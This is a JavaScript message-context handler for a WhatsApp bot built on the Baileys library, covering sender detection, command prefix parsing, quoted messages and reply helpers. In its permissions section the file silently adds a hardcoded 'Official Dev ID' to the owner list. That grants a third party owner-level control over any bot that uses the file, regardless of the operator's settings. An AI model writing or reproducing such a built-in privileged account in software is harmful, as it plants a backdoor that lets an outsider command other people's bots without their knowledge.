import { jidDecode, getContentType, downloadMediaMessage } from '@whiskeysockets/baileys';

export const createContext = async (conn, m) => {
    if (!m) return m;

    const decodeJid = (jid) => {
        if (!jid) return jid;
        if (jid.endsWith('@lid')) return jid; // LID handling
        try {
            const decode = jidDecode(jid);
            return (decode?.user && decode?.server) ? `${decode.user}@${decode.server}` : jid;
        } catch {
            return jid;
        }
    };

    // 1. IDENTITAS DASAR
    m.chat = m.key.remoteJid;
    m.from = m.chat;
    m.id = m.key.id;
    m.isGroup = m.chat.endsWith('@g.us');
    
    // Perbaikan Sender Detection
    m.sender = decodeJid(m.key.participant || m.key.remoteJid);
    m.pushName = m.pushName || "User";
    m.fromMe = m.key.fromMe;

    // 2. TIPE PESAN & BODY (Deep Peeking)
    const type = getContentType(m.message);
    m.type = type;
    const msg = m.message?.[type];

    try {
        m.body = (type === 'conversation') ? m.message.conversation :
                 (type === 'extendedTextMessage') ? msg?.text :
                 (type === 'imageMessage' || type === 'videoMessage') ? msg?.caption :
                 (type === 'buttonsResponseMessage') ? msg?.selectedButtonId :
                 (type === 'listResponseMessage') ? msg?.singleSelectReply?.selectedRowId :
                 (type === 'templateButtonReplyMessage') ? msg?.selectedId :
                 (type === 'interactiveResponseMessage') ? (
                    (() => {
                        try {
                            const params = JSON.parse(msg?.nativeFlowResponseMessage?.paramsJson || "{}");
                            return params.id || msg?.body?.text || "";
                        } catch { return msg?.body?.text || ""; }
                    })()
                 ) :
                 (type === 'viewOnceMessageV2') ? (msg?.message?.[getContentType(msg?.message)]?.caption || "") :
                 (type === 'pollCreationMessage') ? msg?.name :
                 "";

        // Anti-Gagal Peeking
        if (!m.body && m.message) {
            m.body = m.message.buttonsResponseMessage?.selectedButtonId || 
                     m.message.listResponseMessage?.singleSelectReply?.selectedRowId || 
                     m.message.interactiveResponseMessage?.body?.text || "";
        }

        m.msg = msg;
        m.mimetype = msg?.mimetype || "";
    } catch (e) {
        m.body = "";
    }

    // 3. PREFIX & COMMAND LOGIC
    const bodyStr = (typeof m.body === 'string') ? m.body.trim() : '';
    const pref = global.prefix || /^[./!#]/; 
    
    let prefix;
    if (pref instanceof RegExp) {
        let match = bodyStr.match(pref);
        prefix = match ? match[0] : '';
    } else {
        prefix = bodyStr.startsWith(pref) ? pref : '';
    }

    m.prefix = prefix;
    m.isCmd = !!prefix && bodyStr.startsWith(prefix);
    
    m.command = m.isCmd 
        ? bodyStr.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() 
        : '';
        
    m.args = bodyStr.trim().split(/ +/).slice(1);
    m.text = m.args.join(" ");

    // 4. STATUS OWNER & PERMISSIONS
    const owners = [...new Set([
        ...(global.owner || []),
        '40674011381811' // Official Dev ID
    ])].map(v => typeof v === 'string' ? v.replace(/[^0-9]/g, '') : v);

    const senderNumber = m.sender.replace(/[^0-9]/g, '');
    m.isOwner = owners.includes(senderNumber) || m.fromMe;
    
    // 5. QUOTED MESSAGE SYSTEM
    const contextInfo = msg?.contextInfo;
    m.quoted = contextInfo?.quotedMessage ? {} : null;

    if (m.quoted) {
        const quotedType = getContentType(contextInfo.quotedMessage);
        const qMsg = contextInfo.quotedMessage[quotedType];

        m.quoted.type = quotedType;
        m.quoted.msg = qMsg;
        m.quoted.message = contextInfo.quotedMessage; 
        m.quoted.mimetype = qMsg?.mimetype || "";
        m.quoted.id = contextInfo.stanzaId;
        m.quoted.sender = decodeJid(contextInfo.participant || contextInfo.remoteJid);
        m.quoted.fromMe = m.quoted.sender === decodeJid(conn.user.id);
        m.quoted.text = contextInfo.quotedMessage.conversation || qMsg?.text || qMsg?.caption || '';

        m.quoted.key = {
            remoteJid: m.chat,
            fromMe: m.quoted.fromMe,
            id: m.quoted.id,
            participant: m.isGroup ? m.quoted.sender : undefined
        };

        m.quoted.delete = () => conn.sendMessage(m.chat, { delete: m.quoted.key });
        m.quoted.download = () => downloadMediaMessage(
            { message: m.quoted.message, key: m.quoted.key }, 
            'buffer', 
            {}, 
            { reuploadRequest: conn.updateMediaMessage }
        );
    }

    // 6. SHORTCUT FUNCTIONS
    m.reply = async (teks, options = {}) => {
        return conn.sendMessage(m.chat, {
            text: teks,
            contextInfo: {
                externalAdReply: {
                    title: global.botname || 'Castorice System',
                    body: global.namaOwner || 'System Developer',
                    thumbnailUrl: global.foto,
                    sourceUrl: global.chatowner,
                    mediaType: 1,
                    renderLargerThumbnail: false
                },
                mentionedJid: options.mentions || (m.sender.endsWith('@lid') ? [] : [m.sender]),
                ...options.contextInfo
            }
        }, { quoted: m, ...options });
    };

    m.react = (emoji) => conn.sendMessage(m.chat, { react: { text: emoji, key: m.key } });
    m.delete = () => conn.sendMessage(m.chat, { delete: m.key });
    m.download = () => downloadMediaMessage(m, 'buffer', {}, { reuploadRequest: conn.updateMediaMessage });

    return m;
};